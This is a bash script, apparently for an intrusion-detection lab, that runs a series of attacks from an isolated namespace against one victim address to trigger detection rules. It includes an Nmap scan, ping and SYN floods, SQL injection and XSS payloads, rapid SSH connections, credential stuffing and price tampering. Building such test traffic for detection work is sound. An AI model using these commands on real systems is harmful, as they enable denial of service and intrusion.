#!/usr/bin/env bash
# ---------------------------------------------------------------------
# attack_demo.sh — malicious traffic generator, run FROM THE HOST
# (it wraps every command in `ip netns exec ns-attacker ...` for you).
#
# All traffic here is either synthetic/simulated or the industry-
# standard, harmless EICAR antivirus test string — nothing here is
# real malware or a real exploit. It only exists inside your isolated
# lab namespaces and never touches a real network.
#
# Usage:
#   sudo bash attack_demo.sh <attack>
#
# Attacks:
#   scan      Nmap SYN scan            -> triggers sid 1000001
#   icmp      ICMP ping flood          -> triggers sid 1000010
#   synflood  TCP SYN flood (hping3)   -> triggers sid 1000011
#   sqli      HTTP SQL injection       -> triggers sid 1000020
#   xss       HTTP XSS probe           -> triggers sid 1000022
#   eicar     EICAR test signature     -> triggers sid 1000030
#   sshbrute  Repeated SSH SYNs        -> triggers sid 1000040
#   stuffing  Credential-stuffing burst -> triggers sid 1000050
#   tamper    Order-total tampering      -> triggers sid 1000051
#   all       Run everything in sequence, pausing between each
# ---------------------------------------------------------------------
set -euo pipefail

if [[ $EUID -ne 0 ]]; then
    echo "Run as root: sudo bash $0 <attack>" >&2
    exit 1
fi

VICTIM=10.0.0.2
NS="ip netns exec ns-attacker"

pause() { echo; read -rp ">>> Press ENTER to continue... " _; echo; }

attack_scan() {
    echo "[*] Nmap SYN scan against $VICTIM (top 1000 ports)"
    $NS nmap -sS -T4 -Pn "$VICTIM" || true
}

attack_icmp() {
    echo "[*] ICMP flood against $VICTIM (300 packets, flood mode)"
    $NS timeout 6 ping -f -c 300 "$VICTIM" || true
}

attack_synflood() {
    echo "[*] TCP SYN flood against $VICTIM:80 (hping3, 5s)"
    $NS timeout 5 hping3 -S -p 80 --flood "$VICTIM" || true
}

attack_sqli() {
    echo "[*] HTTP SQL injection attempt against $VICTIM"
    $NS curl -s "http://$VICTIM/login?user=admin' OR '1'='1&pass=x" -o /dev/null -w "HTTP %{http_code}\n" || true
}

attack_xss() {
    echo "[*] HTTP XSS probe against $VICTIM"
    $NS curl -s "http://$VICTIM/comment?text=<script>alert(1)</script>" -o /dev/null -w "HTTP %{http_code}\n" || true
}

attack_eicar() {
    echo "[*] Sending EICAR antivirus test string to $VICTIM (harmless, standard test file)"
    $NS curl -s -X POST --data 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' \
        "http://$VICTIM/upload" -o /dev/null -w "HTTP %{http_code}\n" || true
}

attack_sshbrute() {
    echo "[*] 15 rapid SSH connection attempts against $VICTIM:22"
    for i in $(seq 1 15); do
        $NS timeout 1 bash -c "echo > /dev/tcp/$VICTIM/22" 2>/dev/null || true
    done
    echo "done"
}

attack_stuffing() {
    echo "[*] QuickBite credential-stuffing simulation: 15 login attempts"
    for i in $(seq 1 15); do
        $NS curl -s -X POST --data "user=customer$i&password=quickbite-demo-guess" \
            "http://$VICTIM/login" -o /dev/null -w "HTTP %{http_code}\n" || true
    done
}

attack_tamper() {
    echo "[*] QuickBite checkout price-tampering simulation (controlled test value)"
    $NS curl -s -X POST --data 'item=burger&quantity=1&total=0.01' \
        "http://$VICTIM/checkout" -o /dev/null -w "HTTP %{http_code}\n" || true
}

case "${1:-}" in
    scan)     attack_scan ;;
    icmp)     attack_icmp ;;
    synflood) attack_synflood ;;
    sqli)     attack_sqli ;;
    xss)      attack_xss ;;
    eicar)    attack_eicar ;;
    sshbrute) attack_sshbrute ;;
    stuffing) attack_stuffing ;;
    tamper)   attack_tamper ;;
    all)
        attack_scan;     pause
        attack_icmp;     pause
        attack_synflood; pause
        attack_sqli;     pause
        attack_xss;      pause
        attack_eicar;    pause
        attack_sshbrute; pause
        attack_stuffing; pause
        attack_tamper
        ;;
    *)
        echo "Usage: sudo bash $0 {scan|icmp|synflood|sqli|xss|eicar|sshbrute|stuffing|tamper|all}"
        exit 1
        ;;
esac
